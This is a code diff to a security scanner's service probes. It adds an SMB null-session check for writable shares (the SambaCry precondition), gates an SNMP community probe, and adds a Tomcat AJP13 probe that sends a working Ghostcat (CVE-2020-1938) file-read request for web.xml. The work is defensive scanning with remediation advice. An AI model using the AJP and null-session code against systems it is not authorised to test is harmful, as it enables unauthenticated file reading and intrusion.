@@ -5,9 +5,10 @@ import struct
 
 import requests
 
+from ...constants import AUTH_SKIPPED
 from ...findings import Finding, Severity, probe_result, probe_error
 from ... import cvss_vectors as V
-from ...cve_db import check_cves
+from ...cve_db import check_cves, probe_cve_fields
 from ..probe_registry import register_probe, CATEGORY_SERVICE_INFO
 from ._base import _ServiceProbeBase
 
@@ -193,8 +194,8 @@ class _ServiceInfraMixin(_ServiceProbeBase):
   @register_probe(
     display_name="SNMP service detection",
     description=(
-      "SNMP v1/v2c/v3 detection with default-community probes "
-      "(public/private). Walks system MIB to detect ICS/SCADA "
+      "SNMP v1/v2c/v3 detection with the default community probe "
+      "(public), sent only when active_auth is on. Walks system MIB to detect ICS/SCADA "
       "indicators and leaked interface IPs."
     ),
     category=CATEGORY_SERVICE_INFO,
@@ -218,6 +219,8 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     dict
       Structured findings.
     """
+    if not self._login_attempts_allowed():
+      return probe_result(raw_data={"banner": None, "auth_control": dict(AUTH_SKIPPED)}, findings=[])
     findings = []
     raw = {"banner": None}
     sock = None
@@ -1029,6 +1032,33 @@ class _ServiceInfraMixin(_ServiceProbeBase):
           confidence="certain",
         ))
 
+    # CVE-2017-7494: a share the anonymous session may write to is the precondition SambaCry needs.
+    if shares and any("CVE-2017-7494" in (f.cve or ()) for f in findings):
+      access, access_error = self._smb_share_access(target, port, shares)
+      raw["share_access"] = {name: (f"0x{v:08x}" if isinstance(v, int) else v) for name, v in access.items()}
+      if access_error:
+        raw["share_access_error"] = access_error
+        self.P(f"SMB share access check failed on {target}:{port}: {access_error}", color='y')
+      writable = sorted(n for n, v in access.items() if isinstance(v, int) and v & self._SMB_WRITE_RIGHTS)
+      if writable:
+        findings.append(Finding(
+          severity=Severity.CRITICAL,
+          cvss_vector=V.UNAUTHENTICATED_READ_WRITE,
+          title="CVE-2017-7494: Samba writable share (SambaCry precondition)",
+          cve=("CVE-2017-7494",),
+          **probe_cve_fields("CVE-2017-7494"),
+          description=f"Samba {samba_version} is in the affected range and the anonymous session holds write "
+                      "rights on a share, the precondition for loading a shared library through it. "
+                      "No file was written and no module was loaded.",
+          evidence=f"Tree Connect maximal access, writable: {writable}; Samba {samba_version}",
+          remediation="Upgrade Samba to 4.6.4 or later; set 'nt pipe support = no'; "
+                      "remove anonymous write access and mount shares noexec.",
+          owasp_id="A06:2021",
+          cwe_id="CWE-94",
+          confidence="firm",
+          confidence_reason="behaviour_confirmed",
+        ))
+
     if not findings:
       findings.append(Finding(
         severity=Severity.MEDIUM,
@@ -1046,6 +1076,11 @@ class _ServiceInfraMixin(_ServiceProbeBase):
         confidence="certain",
       ))
 
+    if not shares and protocol_id == b"\xfeSMB":
+      # The enumeration is SMBv1 only (I-226 adds SMB2): say what was observed instead of reporting nothing.
+      raw["shares_error"] = "SMB2 negotiated; SMBv1 share enumeration returned no shares"
+      self.P(f"SMB share enumeration on {target}:{port}: {raw['shares_error']}", color='y')
+
     return probe_result(raw_data=raw, findings=findings)
 
   @staticmethod
@@ -1058,6 +1093,87 @@ class _ServiceInfraMixin(_ServiceProbeBase):
         return None
       buf += chunk
     return buf
+
+  # FILE_WRITE_DATA | FILE_APPEND_DATA | GENERIC_ALL | GENERIC_WRITE (MS-SMB 2.2.4.7.2 access mask)
+  _SMB_WRITE_RIGHTS = 0x00000002 | 0x00000004 | 0x10000000 | 0x40000000
+
+  @staticmethod
+  def _smb_tree_max_access(resp):
+    """``(mask, None)`` from an extended Tree Connect AndX response, else ``(None, reason)``.
+
+    The frame must be an SMB1 Tree Connect AndX (`\\xffSMB`, command 0x75): a stray or leftover frame is not
+    parsed as a mask.
+    """
+    if len(resp) < 32 or resp[0:4] != b"\xffSMB" or resp[4] != 0x75:
+      return None, "unexpected response frame"
+    status = struct.unpack_from("<I", resp, 5)[0]
+    if status != 0:
+      return None, f"status 0x{status:08x}"
+    if len(resp) < 47 or resp[32] != 7:
+      return None, "short response"
+    return struct.unpack_from("<I", resp, 39)[0], None
+
+  def _smb_share_access(self, target, port, shares):
+    """Maximal access rights the null session holds on each disk share, from Tree Connect AndX only.
+
+    Read-only: negotiate, null Session Setup, one Tree Connect per share (extended response flag), no
+    open, write or upload. Returns ``({share: mask or {"error": reason}}, error)``; ``error`` is None or the exception text,
+    so a helper failure is not read as "no writable share".
+    """
+    access = {}
+    sock = None
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(self._target_timeout(4))
+      sock.connect((target, port))
+
+      def _exchange(cmd, words_and_bytes, uid=0, tid=0):
+        hdr = bytearray(32)
+        hdr[0:4] = b"\xffSMB"
+        hdr[4] = cmd
+        hdr[13] = 0x18
+        struct.pack_into("<H", hdr, 14, 0xC803)
+        struct.pack_into("<H", hdr, 24, tid)
+        struct.pack_into("<H", hdr, 28, uid)
+        payload = bytes(hdr) + words_and_bytes
+        sock.sendall(b"\x00" + struct.pack(">I", len(payload))[1:] + payload)
+        resp_hdr = self._smb_recv_exact(sock, 4)
+        if not resp_hdr:
+          return None
+        size = struct.unpack(">I", b"\x00" + resp_hdr[1:4])[0]
+        if size > 65536:
+          raise ValueError(f"SMB frame of {size} bytes exceeds the 65536 cap")  # unread bytes would desync
+        return self._smb_recv_exact(sock, size)
+
+      dialects = b"\x02NT LM 0.12\x00"
+      neg = _exchange(0x72, struct.pack("<BH", 0, len(dialects)) + dialects)
+      if not neg or len(neg) < 32:
+        return access, "negotiate failed"
+      words = struct.pack("<BBHHIHIHII", 13, 0xFF, 0, 0, 65535, 1, 0, 0, 0, 0) + struct.pack("<I", 0x000000D4)
+      sess = _exchange(0x73, words + struct.pack("<H", 1) + b"\x00")
+      if not sess or len(sess) < 32 or struct.unpack_from("<I", sess, 5)[0] not in (0, 0xC0000016):
+        return access, "null session refused"
+      uid = struct.unpack_from("<H", sess, 28)[0]
+      # only disk shares; IPC$, printers and admin shares are not a SambaCry upload path
+      disk_shares = [s for s in shares if (s.get("type", 0) & 0xFF) == 0 and not s["name"].endswith("$")]
+      for share in disk_shares[:16]:
+        name = share["name"]
+        path = f"\\\\{target}\\{name}".encode("utf-16-le") + b"\x00\x00"
+        body = b"\x00" + path + b"?????\x00"
+        # wct 4: AndXCommand, reserved, AndXOffset, Flags (0x0008 = extended response), PasswordLength
+        words = struct.pack("<BBBHHH", 4, 0xFF, 0, 0, 0x0008, 1)
+        resp = _exchange(0x75, words + struct.pack("<H", len(body)) + body, uid=uid)
+        mask, reason = self._smb_tree_max_access(resp) if resp else (None, "no response")
+        access[name] = mask if mask is not None else {"error": reason}
+    except Exception as exc:
+      return access, str(exc)
+    finally:
+      if sock is not None:
+        try:
+          sock.close()
+        except Exception:
+          pass
+    return access, None
 
   def _smb_enum_shares(self, target, port):
     """Enumerate SMB shares via null session + IPC$ + srvsvc NetShareEnumAll.
@@ -2181,3 +2297,114 @@ class _ServiceInfraMixin(_ServiceProbeBase):
     except Exception:
       pass
     return findings
+
+  # ── Tomcat AJP13 ────────────────────────────────────────────────
+
+  _AJP_FILE = "/WEB-INF/web.xml"
+  _AJP_MARKER = b"<web-app"
+  _AJP_MAX_READ = 65536
+  _AJP_MAX_PACKETS = 64
+  _AJP_DEADLINE = 10  # seconds for the whole answer
+  # Not "/" and not ending in ".jsp": a welcome file or the JSP servlet could compile web.xml.
+  _AJP_REQ_URI = "/redmesh-ajp"
+
+  @staticmethod
+  def _ajp_string(text):
+    raw = text.encode()
+    return struct.pack(">H", len(raw)) + raw + b"\x00"
+
+  def _ajp_forward_request(self, target, port, file_path):
+    """AJP13 GET whose include attributes make Tomcat serve `file_path` (CVE-2020-1938)."""
+    s = self._ajp_string
+    body = b"\x02\x02" + s("HTTP/1.1") + s(self._AJP_REQ_URI) + s("127.0.0.1") + b"\xff\xff" + s(target)
+    body += struct.pack(">H", port) + b"\x00" + struct.pack(">H", 0)  # not SSL, no headers
+    for name, value in (
+      ("javax.servlet.include.request_uri", "/"),
+      ("javax.servlet.include.path_info", file_path),
+      ("javax.servlet.include.servlet_path", "/"),
+    ):
+      body += b"\x0a" + s(name) + s(value)
+    body += b"\xff"
+    return b"\x12\x34" + struct.pack(">H", len(body)) + body
+
+  def _ajp_read_file(self, sock):
+    """Collect body chunks until END_RESPONSE, the size or packet cap, the deadline or an error.
+
+    Returns the content read so far, also when the read ends early.
+    """
+    data, buf = b"", b""
+    deadline = self._deadline_in(self._AJP_DEADLINE)
+    try:
+      for _ in range(self._AJP_MAX_PACKETS):
+        while len(buf) < 4 or len(buf) < 4 + struct.unpack(">H", buf[2:4])[0]:
+          chunk = self._recv_by(sock, 4096, deadline)
+          if not chunk:
+            return data
+          buf += chunk
+        if buf[:2] != b"AB":
+          return data
+        length = struct.unpack(">H", buf[2:4])[0]
+        packet, buf = buf[4:4 + length], buf[4 + length:]
+        kind = packet[:1]
+        if kind == b"\x03" and len(packet) >= 3:  # SEND_BODY_CHUNK
+          data += packet[3:3 + struct.unpack(">H", packet[1:3])[0]]
+          if len(data) >= self._AJP_MAX_READ:
+            return data
+        elif kind != b"\x04":  # not SEND_HEADERS: END_RESPONSE or anything unexpected ends the read
+          return data
+    except (socket.timeout, OSError):
+      pass
+    return data
+
+  @register_probe(
+    display_name="Tomcat AJP13 file read (Ghostcat)",
+    description=(
+      "Over raw AJP13, read /WEB-INF/web.xml from the web application and "
+      "confirm CVE-2020-1938 when the content matches. Keeps the match marker only."
+    ),
+    category=CATEGORY_SERVICE_INFO,
+    default_cwe=(20,),
+    default_owasp=("A06:2021",),
+    cvss_template="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+  )
+  def _service_info_ajp(self, target, port):  # default port: 8009
+    """
+    Ghostcat check. Sends one AJP13 forward request for a fixed file; no credential is used,
+    so the feature holding this probe gates it, not `active_auth`.
+    """
+    raw = {"ajp_file": self._AJP_FILE}
+    sock = None
+    try:
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.settimeout(self._target_timeout(3))
+      sock.connect((target, port))
+      sock.sendall(self._ajp_forward_request(target, port, self._AJP_FILE))
+      content = self._ajp_read_file(sock)
+    except Exception as exc:
+      raw["ajp_error"] = str(exc)[:120]
+      return probe_result(raw_data=raw, findings=[])
+    finally:
+      if sock:
+        sock.close()
+
+    findings = []
+    if self._AJP_MARKER in content:
+      marker = self._AJP_MARKER.decode()
+      raw["ajp_marker"] = marker
+      findings.append(Finding(
+        severity=Severity.CRITICAL,
+        cvss_vector=V.UNAUTHENTICATED_FULL_CONTROL,
+        title="Tomcat AJP file read confirmed (Ghostcat, CVE-2020-1938)",
+        cve=("CVE-2020-1938",),
+        **probe_cve_fields("CVE-2020-1938"),
+        description=f"The AJP13 connector on {target}:{port} served {self._AJP_FILE} from the web application "
+                    "to an unauthenticated request. The same flaw allows reading any file under the web root.",
+        evidence=f"AJP13 request for {self._AJP_FILE} returned content containing the marker '{marker}'",
+        remediation="Upgrade Tomcat to 9.0.31, 8.5.51, 7.0.100 or later; set a 'secret' on the AJP connector "
+                    "or disable it; do not expose port 8009.",
+        owasp_id="A06:2021",
+        cwe_id="CWE-20",
+        confidence="certain",
+        confidence_reason="behaviour_confirmed",
+      ))
+    return probe_result(raw_data=raw, findings=findings)
